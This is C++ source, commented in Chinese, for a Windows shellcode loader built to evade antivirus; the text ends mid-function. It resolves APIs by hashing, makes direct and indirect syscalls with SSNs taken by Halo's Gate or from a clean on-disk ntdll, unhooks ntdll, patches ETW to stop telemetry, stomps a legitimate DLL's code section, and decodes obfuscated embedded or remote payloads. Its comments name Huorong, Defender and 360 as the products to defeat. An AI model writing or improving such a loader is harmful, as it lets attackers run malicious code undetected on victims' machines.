/*
 * loader.cpp -- Shellcode 加载器 v3 (Windows x86/x64)
 *
 * 用法:
 *   文件传参版:  loader.exe <payload> [direct|fiber|callback]
 *   内嵌版:      <payload>.exe [direct|fiber|callback]
 *
 * v3 相对 v2 的改进 (针对"进程在解密阶段被杀"):
 *   [V3-1] 直接系统调用: NtAllocateVirtualMemory / NtProtectVirtualMemory
 *          用运行期构造的 syscall stub 执行, 绕过火绒/Defender 的 ntdll 用户态钩子
 *          SSN 解析: 先扫 stub 的 B8 xx xx xx xx 0F 05, 失败则用 Halo's Gate 邻居推导
 *   [V3-2] 原地解密: 先分配目标内存, 再把 payload 直接解到目标内存里,
 *          不再产生额外的"明文堆副本", 缩短明文暴露窗口
 *   [V3-3] 执行前随机抖动延迟, 打断 解密->执行 的时序关联
 *   [V3-4] 分步日志 (每步单独一行), 被杀时能精确定位到哪一步
 *   [V3-5] syscall 失败自动回退 kernel32, 不会因 SSN 取错而失效
 *
 * 免杀技术: [T1]UUID混淆 [T2]PEB+DJB2 [T3]Fiber [T4]回调 [T5]RW->RX
 *           [T6]反调试/反沙箱 [T7]无敏感命名 [T8]payload分离
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

typedef LONG NTSTATUS_T;            /* 自备 NTSTATUS, 避免依赖 winternl.h */
typedef NTSTATUS_T (WINAPI *fnNtAlloc)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS_T (WINAPI *fnNtProt)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

extern "C" { extern int __argc; extern char **__argv; }   /* GUI 模式取命令行 */

#if defined(ENC_UUID)
extern "C" const char *g_embed_uuids[];
extern "C" const unsigned int g_embed_uuid_count;
extern "C" const unsigned int g_embed_uuid_len;
extern "C" const unsigned char g_embed_key;
#elif defined(ENC_B64) || defined(ENC_B32)
extern "C" const char *g_parts[];
extern "C" const unsigned int g_parts_n;
extern "C" const unsigned int g_embed_len;
extern "C" const unsigned char g_embed_key;
#elif defined(ENC_CHUNK)
extern "C" const unsigned char *g_chunks[];
extern "C" const unsigned int g_chunk_lens[];
extern "C" const unsigned char g_chunk_keys[];
extern "C" const unsigned char g_chunk_flags[];
extern "C" const unsigned int g_chunk_n;
extern "C" const unsigned int g_embed_len;
#elif defined(ENC_RAW)
extern "C" const unsigned char g_embed_data[];
extern "C" const unsigned int  g_embed_len;
extern "C" const unsigned char g_embed_key;
#elif defined(USE_REMOTE)
extern "C" const char *g_remote_url;
extern "C" const unsigned char g_embed_key;
#endif

#if defined(ENC_B32)
extern "C" const char g_b32_alpha[33];
#endif

#if defined(HARDEN_STOMP)
extern "C" const char *g_stomp_dll;   /* 用于模块踩踏的白 DLL 名 */
#endif

/* 防呆: 无控制台的 GUI 版必须是"内嵌/远程"模式。
 * 否则会掉进"文件传参"分支, 运行时因缺参数直接 return 2 — 表现为"双击没反应"。 */
#if defined(GUI_MODE) && !defined(ENC_UUID) && !defined(ENC_B64) && \
    !defined(ENC_B32) && !defined(ENC_CHUNK) && !defined(ENC_RAW) && \
    !defined(USE_REMOTE)
#error "GUI 版缺少编码宏(ENC_*): 会被误编译成文件传参模式, 运行即退出"
#endif

/* ===================================================================== *
 *  日志                                                                 *
 * ===================================================================== */
static FILE *g_log = NULL;

static void log_open(void) { g_log = NULL; } /* log disabled */

static void logf_(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt); vprintf(fmt, ap); va_end(ap);
    printf("\n"); fflush(stdout);
    if (g_log) {
        va_start(ap, fmt); vfprintf(g_log, fmt, ap); va_end(ap);
        fputc('\n', g_log); fflush(g_log);
    }
}

typedef int (WINAPI *pMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
static pMessageBoxA g_mb = NULL;

static void fatal(const char *msg)
{
    logf_("[FATAL] %s", msg);
    if (g_mb) {
#if defined(SHOW_ERRORS)
        g_mb(NULL, msg, "loader", MB_ICONERROR | MB_SETFOREGROUND);
#elif defined(GUI_MODE)
        /* GUI 版默认静默(不弹框), 需要时设 LDR_MSG=1 */
        char e[4] = {0};
        if (GetEnvironmentVariableA("LDR_MSG", e, sizeof(e)) && e[0] == '1')
            g_mb(NULL, msg, "loader", MB_ICONERROR | MB_SETFOREGROUND);
#else
        g_mb(NULL, msg, "loader", MB_ICONERROR | MB_SETFOREGROUND);
#endif
    }
    exit(1);
}

/* ===================================================================== *
 *  PEB / DJB2  (T2)                                                     *
 * ===================================================================== */
typedef struct _USTR { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } USTR;

typedef struct _LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    USTR  FullDllName;
    USTR  BaseDllName;
} LDR_ENTRY;

typedef struct _PEB_LDR {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR;

typedef struct _PEB_T {
    BYTE  Reserved1[2];
    BYTE  BeingDebugged;
    BYTE  Reserved2[1];
    PVOID Reserved3[2];
    PEB_LDR *Ldr;
} PEB_T;

static PEB_T *get_peb(void)
{
#if defined(_MSC_VER)
  #ifdef _WIN64
    return (PEB_T *)__readgsqword(0x60);
  #else
    return (PEB_T *)__readfsdword(0x30);
  #endif
#else
  #ifdef _WIN64
    PEB_T *p; __asm__("movq %%gs:0x60, %0" : "=r"(p)); return p;
  #else
    PEB_T *p; __asm__("movl %%fs:0x30, %0" : "=r"(p)); return p;
  #endif
#endif
}

static DWORD djb2(const char *s)
{
    DWORD h = 5381;
    while (*s) {
        unsigned char c = (unsigned char)*s++;
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + c;
    }
    return h;
}

static DWORD djb2w(const WCHAR *s)
{
    DWORD h = 5381;
    while (*s) {
        WCHAR c = *s++;
        if (c >= L'A' && c <= L'Z') c += 32;
        h = ((h << 5) + h) + (unsigned char)(c & 0xFF);
    }
    return h;
}

static HMODULE mod_by_hash(DWORD name_hash)
{
    PEB_T *peb = get_peb();
    if (!peb || !peb->Ldr) return NULL;
    LIST_ENTRY *head = &peb->Ldr->InLoadOrderModuleList;
    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
        LDR_ENTRY *ent = (LDR_ENTRY *)e;
        if (ent->BaseDllName.Buffer && djb2w(ent->BaseDllName.Buffer) == name_hash)
            return (HMODULE)ent->DllBase;
    }
    return NULL;
}

static FARPROC api_by_hash(HMODULE mod, DWORD name_hash)
{
    if (!mod) return NULL;
    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    IMAGE_DATA_DIRECTORY *dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress) return NULL;
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + dir->VirtualAddress);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ords  = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *fn = (const char *)(base + names[i]);
        if (djb2(fn) == name_hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return NULL;
}

#define R(mod, fn) api_by_hash(mod, djb2(fn))

/* 取模块全路径 (PEB LDR FullDllName) */
static const WCHAR *mod_full_path(DWORD name_hash)
{
    PEB_T *peb = get_peb();
    if (!peb || !peb->Ldr) return NULL;
    LIST_ENTRY *head = &peb->Ldr->InLoadOrderModuleList;
    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
        LDR_ENTRY *ent = (LDR_ENTRY *)e;
        if (ent->BaseDllName.Buffer && djb2w(ent->BaseDllName.Buffer) == name_hash)
            return ent->FullDllName.Buffer;
    }
    return NULL;
}

/* ===================================================================== *
 *  [V3-1] 直接系统调用 (x64)                                            *
 * ===================================================================== */
static BYTE *g_nt = NULL;      /* ntdll base */
static BYTE *g_alloc_stub = NULL;
static BYTE *g_prot_stub  = NULL;
static BYTE *g_gadget     = NULL;   /* ntdll 内的 syscall;ret gadget */

/* 从 syscall stub 里读 SSN: 48 8B D1 / 4C 8B D1 ... B8 <ssn> 0F 05 */
static LONG ssn_from_stub(BYTE *fn)
{
    for (int i = 0; i <= 28; i++)
        if (fn[i] == 0xB8 && fn[i + 5] == 0x0F && fn[i + 6] == 0x05)
            return *(LONG *)(fn + i + 1);
    return -1;
}

static int cmp_rva(const void *a, const void *b)
{
    DWORD x = *(const DWORD *)a, y = *(const DWORD *)b;
    return (x > y) - (x < y);
}

/* Halo's Gate: ntdll 按地址排序时 SSN 单调递增, 用已知邻居 + 序号差补偿 */
static LONG ssn_halos_gate(BYTE *base, BYTE *target)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *d =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + d->VirtualAddress);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);
    DWORD n = exp->NumberOfFunctions;
    if (n == 0 || n > 8192) return -1;

    DWORD *rva = (DWORD *)malloc(n * sizeof(DWORD));
    if (!rva) return -1;
    DWORD m = 0;
    for (DWORD i = 0; i < n; i++) if (funcs[i]) rva[m++] = funcs[i];
    if (m < 3) { free(rva); return -1; }
    qsort(rva, m, sizeof(DWORD), cmp_rva);

    DWORD trva = (DWORD)(target - base);
    LONG found = -1;
    LONG tpos = -1;
    for (DWORD i = 0; i < m; i++) if (rva[i] == trva) { tpos = (LONG)i; break; }
    if (tpos >= 0) {
        LONG known_pos = -1, known_ssn = -1;
        for (LONG j = tpos - 1; j >= 0; j--) {
            LONG s = ssn_from_stub(base + rva[j]);
            if (s >= 0) { known_pos = j; known_ssn = s; break; }
        }
        if (known_pos < 0)
            for (LONG j = tpos + 1; j < (LONG)m; j++) {
                LONG s = ssn_from_stub(base + rva[j]);
                if (s >= 0) { known_pos = j; known_ssn = s; break; }
            }
        if (known_pos >= 0) found = known_ssn + (tpos - known_pos);
    }
    free(rva);
    return found;
}

/* 构造 syscall stub
 *   直连: 4C 8B D1 | B8 <ssn> | 0F 05 | C3
 *   间接: 4C 8B D1 | B8 <ssn> | FF 25 00 00 00 00 | <gadget64>
 *         (jmp 到 ntdll 内部的 syscall;ret, 使 syscall 指令来源合法) */
static BYTE *make_stub(LONG ssn, HMODULE k32)
{
    if (ssn < 0) return NULL;
    typedef LPVOID (WINAPI *pVA)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL   (WINAPI *pVP)(LPVOID, SIZE_T, DWORD, PDWORD);
    pVA va = (pVA)R(k32, "VirtualAlloc");
    pVP vp = (pVP)R(k32, "VirtualProtect");
    if (!va) return NULL;
    /* 先按 RW 分配写入, 写完再翻成 RX。
     * 旧实现直接以 RWX 分配 32 字节并手写 B8 <ssn> 0F 05 C3 ——
     * "小块 RWX + 手写 syscall 序列" 是 direct syscall 的经典检测特征。 */
    BYTE *m = (BYTE *)va(NULL, 32, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!m) return NULL;
    m[0] = 0x4C; m[1] = 0x8B; m[2] = 0xD1;          /* mov r10, rcx */
    m[3] = 0xB8;                                     /* mov eax, imm32 */
    *(DWORD *)(m + 4) = (DWORD)ssn;
#ifdef HARDEN_INDIRECT
    if (g_gadget) {
        m[8] = 0xFF; m[9] = 0x25;                    /* jmp qword ptr [rip+0] */
        m[10] = 0; m[11] = 0; m[12] = 0; m[13] = 0;
        *(void **)(m + 14) = (void *)g_gadget;
    } else
#endif
    {
        m[8] = 0x0F; m[9] = 0x05;                    /* syscall */
        m[10] = 0xC3;                                /* ret */
    }
    if (vp) {
        DWORD old = 0;
        vp(m, 32, PAGE_EXECUTE_READ, &old);
    }
    return m;
}

static LONG resolve_ssn(const char *name)
{
    BYTE *fn = (BYTE *)api_by_hash((HMODULE)g_nt, djb2(name));
    if (!fn) return -1;
    LONG s = ssn_from_stub(fn);
    if (s >= 0) return s;
    return ssn_halos_gate(g_nt, fn);
}

/* --------------------------------------------------------------------- *
 *  [E6] 磁盘版 SSN 解析                                                  *
 *  内存里的 ntdll 被 360 之类改过时, 上面的扫描会全部失败,                 *
 *  这时改从"磁盘上的干净 ntdll"读 stub 拿 SSN.                           *
 * --------------------------------------------------------------------- */
#if defined(_WIN64) && defined(HARDEN_DISKSSN)
/* 把 ntdll 文件读进内存 (原样文件布局, 非映像布局) */
static BYTE *read_ntdll_file(HMODULE k32, DWORD *out_size)
{
    typedef HANDLE (WINAPI *fnCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL   (WINAPI *fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef BOOL   (WINAPI *fnCloseHandle)(HANDLE);
    typedef BOOL   (WINAPI *fnGetFileSizeEx)(HANDLE, PLARGE_INTEGER);
    fnCreateFileW   cF = (fnCreateFileW)R(k32, "CreateFileW");
    fnReadFile      rF = (fnReadFile)R(k32, "ReadFile");
    fnCloseHandle   cH = (fnCloseHandle)R(k32, "CloseHandle");
    fnGetFileSizeEx gS = (fnGetFileSizeEx)R(k32, "GetFileSizeEx");
    if (!cF || !rF || !cH || !gS) return NULL;
    const WCHAR *path = mod_full_path(djb2("ntdll.dll"));
    if (!path) return NULL;
    HANDLE h = cF(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    LARGE_INTEGER li; li.QuadPart = 0;
    gS(h, &li);
    if (li.QuadPart <= 0 || li.QuadPart > (64 << 20)) { cH(h); return NULL; }
    BYTE *buf = (BYTE *)malloc((size_t)li.QuadPart);
    if (!buf) { cH(h); return NULL; }
    DWORD got = 0;
    rF(h, buf, (DWORD)li.QuadPart, &got, NULL);
    cH(h);
    if (got < 0x1000) { free(buf); return NULL; }
    *out_size = got;
    return buf;
}

/* 文件布局下 RVA -> 文件偏移 */
static DWORD rva2off(BYTE *img, DWORD rva)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return rva;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return rva;
    IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD va = s[i].VirtualAddress;
        DWORD vs = s[i].Misc.VirtualSize ? s[i].Misc.VirtualSize : s[i].SizeOfRawData;
        if (rva >= va && rva < va + vs)
            return s[i].PointerToRawData + (rva - va);
    }
    return rva;
}

/* 在文件映像里按哈希找导出函数, 返回文件内指针 */
static BYTE *file_export(BYTE *img, DWORD name_hash)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    IMAGE_DATA_DIRECTORY *dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress) return NULL;

    IMAGE_EXPORT_DIRECTORY *exp =
        (IMAGE_EXPORT_DIRECTORY *)(img + rva2off(img, dir->VirtualAddress));
    DWORD *names = (DWORD *)(img + rva2off(img, exp->AddressOfNames));
    WORD  *ords  = (WORD  *)(img + rva2off(img, exp->AddressOfNameOrdinals));
    DWORD *funcs = (DWORD *)(img + rva2off(img, exp->AddressOfFunctions));
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *fn = (const char *)(img + rva2off(img, names[i]));
        if (djb2(fn) == name_hash)
            return img + rva2off(img, funcs[ords[i]]);
    }
    return NULL;
}

/* 从磁盘映像解析 SSN (含邻居推导兜底) */
static LONG resolve_ssn_disk(const char *name, HMODULE k32)
{
    DWORD sz = 0;
    BYTE *img = read_ntdll_file(k32, &sz);
    if (!img) { logf_("[E6] 读取磁盘 ntdll 失败"); return -1; }
    LONG s = -1;
    BYTE *fn = file_export(img, djb2(name));
    if (fn) {
        s = ssn_from_stub(fn);
        if (s < 0) {
            /* 邻居推导: 遍历所有导出, 按函数 RVA 排序后补偿 */
            IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
            IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
            IMAGE_DATA_DIRECTORY *d =
                &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            IMAGE_EXPORT_DIRECTORY *exp =
                (IMAGE_EXPORT_DIRECTORY *)(img + rva2off(img, d->VirtualAddress));
            DWORD *funcs = (DWORD *)(img + rva2off(img, exp->AddressOfFunctions));
            DWORD n = exp->NumberOfFunctions;
            if (n && n <= 8192) {
                DWORD *rva = (DWORD *)malloc(n * sizeof(DWORD));
                if (rva) {
                    DWORD m = 0;
                    for (DWORD i = 0; i < n; i++) if (funcs[i]) rva[m++] = funcs[i];
                    qsort(rva, m, sizeof(DWORD), cmp_rva);
                    DWORD trva = (DWORD)((fn - img));   /* 已经是文件偏移, 用偏移比对 */
                    LONG tpos = -1;
                    for (DWORD i = 0; i < m; i++)
                        if (rva2off(img, rva[i]) == trva) { tpos = (LONG)i; break; }
                    if (tpos >= 0) {
                        for (LONG j = tpos - 1; j >= 0; j--) {
                            LONG ns = ssn_from_stub(img + rva2off(img, rva[j]));
                            if (ns >= 0) { s = ns + (tpos - j); break; }
                        }
                        if (s < 0)
                            for (LONG j = tpos + 1; j < (LONG)m; j++) {
                                LONG ns = ssn_from_stub(img + rva2off(img, rva[j]));
                                if (ns >= 0) { s = ns - (j - tpos); break; }
                            }
                    }
                    free(rva);
                }
            }
        }
    }
    free(img);
    return s;
}
#endif /* _WIN64 && HARDEN_DISKSSN */

/* ===================================================================== *
 *  payload 读取 / 解析 (文件传参版)                                     *
 * ===================================================================== */
/* ===================================================================== *
 *  [E] 免杀增强层 (针对 360 等强行为引擎)                               *
 *      E1 ntdll 脱钩   E2 ETW 屏蔽   E3 间接系统调用   E4 模块踩踏      *
 * ===================================================================== */

#if defined(HARDEN_UNHOOK) || defined(HARDEN_ETW) || defined(HARDEN_INDIRECT) || defined(HARDEN_STOMP)
/* 解析 PE 节表 */
static IMAGE_SECTION_HEADER *pe_sections(BYTE *base, int *count)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { *count = 0; return NULL; }
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { *count = 0; return NULL; }
    *count = nt->FileHeader.NumberOfSections;
    return (IMAGE_SECTION_HEADER *)((BYTE *)&nt->OptionalHeader +
                                    nt->FileHeader.SizeOfOptionalHeader);
}
#endif

#if defined(HARDEN_UNHOOK)
/* [E1] 用磁盘上的干净 ntdll 覆盖内存中 ntdll 的 .text, 抹掉杀软的 inline hook */
static int unhook_ntdll(BYTE *ntdll, HMODULE k32)
{
    typedef HANDLE (WINAPI *fnCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL   (WINAPI *fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef BOOL   (WINAPI *fnCloseHandle)(HANDLE);
    typedef BOOL   (WINAPI *fnGetFileSizeEx)(HANDLE, PLARGE_INTEGER);
    typedef LPVOID (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL   (WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

    fnCreateFileW     cFile = (fnCreateFileW)R(k32, "CreateFileW");
    fnReadFile        rFile = (fnReadFile)R(k32, "ReadFile");
    fnCloseHandle     cHnd  = (fnCloseHandle)R(k32, "CloseHandle");
    fnGetFileSizeEx   gSize = (fnGetFileSizeEx)R(k32, "GetFileSizeEx");
    fnVirtualAlloc    vAll  = (fnVirtualAlloc)R(k32, "VirtualAlloc");
    fnVirtualProtect  vProt = (fnVirtualProtect)R(k32, "VirtualProtect");
    if (!cFile || !rFile || !cHnd || !gSize || !vAll || !vProt) return 0;

    const WCHAR *path = mod_full_path(djb2("ntdll.dll"));
    if (!path) { logf_("[E1] ntdll 路径获取失败"); return 0; }

    HANDLE h = cFile(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) { logf_("[E1] 打开 ntdll 失败"); return 0; }
    LARGE_INTEGER sz; sz.QuadPart = 0;
    gSize(h, &sz);
    if (sz.QuadPart <= 0 || sz.QuadPart > (64 << 20)) { cHnd(h); return 0; }
    LPVOID disk = vAll(NULL, (SIZE_T)sz.QuadPart, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!disk) { cHnd(h); return 0; }
    DWORD got = 0;
    rFile(h, disk, (DWORD)sz.QuadPart, &got, NULL);
    cHnd(h);
    if (got < 0x1000) return 0;

    /* 磁盘映像里找 .text */
    int dn = 0;
    IMAGE_SECTION_HEADER *ds = pe_sections((BYTE *)disk, &dn);
    if (!ds) return 0;
    for (int i = 0; i < dn; i++) {
        if (ds[i].Name[0] != '.') continue;
        if (!(ds[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE *dst = ntdll + ds[i].VirtualAddress;
        SIZE_T n = ds[i].SizeOfRawData;
        DWORD old = 0;
        if (!vProt(dst, n, PAGE_EXECUTE_READWRITE, &old)) continue;
        memcpy(dst, (BYTE *)disk + ds[i].PointerToRawData, n);
        vProt(dst, n, old, &old);
    }
    logf_("[E1] ntdll .text 已从磁盘还原");
    return 1;
}
#endif

#if defined(HARDEN_ETW)
/* [E2] 把 EtwEventWrite 改成 ret, 切断 ETW 遥测 */
static int patch_etw(BYTE *ntdll, HMODULE k32)
{
    typedef BOOL (WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    fnVirtualProtect vProt = (fnVirtualProtect)R(k32, "VirtualProtect");
    if (!vProt) return 0;
    BYTE *p = (BYTE *)api_by_hash((HMODULE)ntdll, djb2("EtwEventWrite"));
    if (!p) { logf_("[E2] EtwEventWrite 未找到"); return 0; }
    DWORD old = 0;
    if (!vProt(p, 1, PAGE_EXECUTE_READWRITE, &old)) return 0;
    p[0] = 0xC3;                          /* ret */
    vProt(p, 1, old, &old);
    logf_("[E2] EtwEventWrite 已屏蔽");
    return 1;
}
#endif

#if defined(HARDEN_INDIRECT)
/* [E3] 在 ntdll .text 里找 syscall;ret gadget, 让 syscall 指令本身来自 ntdll */
static BYTE *find_syscall_gadget(BYTE *ntdll)
{
    int n = 0;
    IMAGE_SECTION_HEADER *sec = pe_sections(ntdll, &n);
    if (!sec) return NULL;
    for (int i = 0; i < n; i++) {
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE *p = ntdll + sec[i].VirtualAddress;
        SIZE_T sz = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        if (sz > (8 << 20)) sz = 8 << 20;
        for (SIZE_T k = 0; k + 2 < sz; k++)
            if (p[k] == 0x0F && p[k + 1] == 0x05 && p[k + 2] == 0xC3)
                return p + k;
    }
    return NULL;
}
#endif

#if defined(HARDEN_STOMP)
/* [E4] 模块踩踏: 把 payload 写进一个已加载白 DLL 的可执行节 */
static BYTE *stomp_alloc(HMODULE k32, SIZE_T need, SIZE_T *avail)
{
    typedef HMODULE (WINAPI *fnLLA)(LPCSTR);
    typedef BOOL (WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    fnLLA lla = (fnLLA)R(k32, "LoadLibraryA");
    fnVirtualProtect vProt = (fnVirtualProtect)R(k32, "VirtualProtect");
    if (!lla || !vProt) return NULL;

    HMODULE mod = lla(g_stomp_dll);
    if (!mod) { logf_("[E4] %s 加载失败", g_stomp_dll); return NULL; }

    int n = 0;
    IMAGE_SECTION_HEADER *sec = pe_sections((BYTE *)mod, &n);
    if (!sec) return NULL;
    for (int i = 0; i < n; i++) {
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        SIZE_T sz = sec[i].SizeOfRawData ? sec[i].SizeOfRawData : sec[i].Misc.VirtualSize;
        if (sz < need) continue;
        BYTE *dst = (BYTE *)mod + sec[i].VirtualAddress;
        DWORD old = 0;
        if (!vProt(dst, need, PAGE_READWRITE, &old)) continue;
        *avail = sz;
        logf_("[E4] 踩踏 %s .text @ %p (可用 %lu)", g_stomp_dll, (void *)dst, (unsigned long)sz);
        return dst;
    }
    logf_("[E4] %s 无可用的可执行节(需 %lu)", g_stomp_dll, (unsigned long)need);
    return NULL;
}
#endif
static int hexval(int c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static int uuid_decode(const char *s, BYTE out[16])
{
    int groups[5] = {8, 4, 4, 4, 12};
    BYTE tmp[16];
    int n = 0;
    for (int g = 0; g < 5; g++) {
        for (int i = 0; i < groups[g]; i += 2) {
            int hi = hexval(s[0]), lo = hexval(s[1]);
            if (hi < 0 || lo < 0) return 0;
            tmp[n++] = (BYTE)((hi << 4) | lo);
            s += 2;
        }
        if (g < 4) { if (*s != '-') return 0; s++; }
    }
    out[0] = tmp[3]; out[1] = tmp[2]; out[2] = tmp[1]; out[3] = tmp[0];
    out[4] = tmp[5]; out[5] = tmp[4];
    out[6] = tmp[7]; out[7] = tmp[6];
    for (int i = 8; i < 16; i++) out[i] = tmp[i];
    return 1;
}

/* ------- Base64 / Base32 解码 (忽略非字母表字符, 自动跳过 '=' 与换行) ------- */
#if defined(ENC_B64)
static size_t b64_decode(const char *in, size_t n, BYTE *out)
{
    static const char *A =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int rev[256];
    for (int i = 0; i < 256; i++) rev[i] = -1;
    for (int i = 0; i < 64; i++) rev[(unsigned char)A[i]] = i;
    unsigned long buf = 0;
    int bits = 0;
    size_t o = 0;
    for (size_t i = 0; i < n; i++) {
        int v = rev[(unsigned char)in[i]];
        if (v < 0) continue;
        buf = (buf << 6) | (unsigned long)v;
        bits += 6;
        if (bits >= 8) { bits -= 8; out[o++] = (BYTE)((buf >> bits) & 0xFF); }
    }
    return o;
}
#endif

#if defined(ENC_B32)
static size_t b32_decode(const char *alpha, const char *in, size_t n, BYTE *out)
{
    int rev[256];
    for (int i = 0; i < 256; i++) rev[i] = -1;
    for (int i = 0; i < 32; i++) rev[(unsigned char)alpha[i]] = i;
    unsigned long buf = 0;
    int bits = 0;
    size_t o = 0;
    for (size_t i = 0; i < n; i++) {
        int v = rev[(unsigned char)in[i]];
        if (v < 0) continue;
        buf = (buf << 5) | (unsigned long)v;
        bits += 5;
        if (bits >= 8) { bits -= 8; out[o++] = (BYTE)((buf >> bits) & 0xFF); }
    }
    return o;
}
#endif

static BYTE *read_whole(const char *path, size_t *out_len)
{
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long n = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (n <= 0) { fclose(f); return NULL; }
    BYTE *buf = (BYTE *)malloc((size_t)n);
    if (!buf) { fclose(f); return NULL; }
    size_t rd = fread(buf, 1, (size_t)n, f);
    fclose(f);
    *out_len = rd;
    return buf;
}

static int looks_text(const BYTE *b, size_t n)
{
    size_t chk = n < 512 ? n : 512, ok = 0;
    for (size_t i = 0; i < chk; i++)
        if (b[i] == '\n' || b[i] == '\t' || (b[i] >= 32 && b[i] < 127)) ok++;
    return chk && (ok * 100 / chk) > 90;
}

/* 解析出明文 payload (文件传参版) */
static BYTE *load_file_payload(const char *path, size_t *out_len)
{
    size_t len = 0;
    BYTE *raw = read_whole(path, &len);
    if (!raw) return NULL;
    if (!looks_text(raw, len)) { *out_len = len; return raw; }

    BYTE *out = (BYTE *)malloc(len + 1);
    size_t n = 0;
    for (size_t i = 0; i + 3 < len; i++) {
        if ((raw[i] == '\\' || raw[i] == '0') &&
            (raw[i + 1] == 'x' || raw[i + 1] == 'X')) {
            int hi = hexval(raw[i + 2]), lo = hexval(raw[i + 3]);
